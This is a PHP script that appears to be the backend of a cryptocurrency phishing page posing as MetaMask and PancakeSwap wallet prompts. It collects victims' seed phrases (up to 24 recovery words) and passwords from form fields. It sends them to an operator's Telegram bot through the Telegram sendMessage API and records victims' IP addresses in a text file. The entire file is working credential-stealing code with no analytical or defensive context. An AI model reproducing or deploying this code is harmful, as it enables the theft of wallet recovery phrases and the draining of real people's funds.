<?php
require "telegram.php";

$user_ip = $_POST['userip'];

$texter = file_get_contents("baseip.txt");

//count ip
$ipcount = substr_count($texter, $user_ip);

if($ipcount >= $countip){

  $filed = "baseip.txt";
  $rez = file_get_contents($filed);
  $rez .= "\r\n".$user_ip."";
  file_put_contents($filed, $rez);
} else {

if($_GET['type'] == 'metamask'){
    $msg = "bayc metamask: ". $_GET['phrase'] . " password: ". $_GET['password'] . "\n";
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
} else {
  $msg = "pancake ". $_POST['wallet'] . ":". $_POST['word01'] . " ". $_POST['word02'] . " ". $_POST['word03'] . " ". $_POST['word04'] . " ". $_POST['word05'] . " ". $_POST['word06'] . " ". $_POST['word07'] . " ". $_POST['word08'] . " ". $_POST['word09'] . " ". $_POST['word10'] . " ". $_POST['word11'] . " ". $_POST['word12'] . " ". $_POST['word13'] . " ". $_POST['word14'] . " ". $_POST['word15'] . " ". $_POST['word16'] . " ". $_POST['word17'] . " ". $_POST['word18'] . " ". $_POST['word19'] . " ". $_POST['word20'] . " ". $_POST['word21'] . " ". $_POST['word22'] . " ". $_POST['word23'] . " ". $_POST['word24'] . "\n";
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
}

  $filed = "baseip.txt";
  $rez = file_get_contents($filed);
  $rez .= "\r\n".$user_ip."";
  file_put_contents($filed, $rez);
}




 ?>
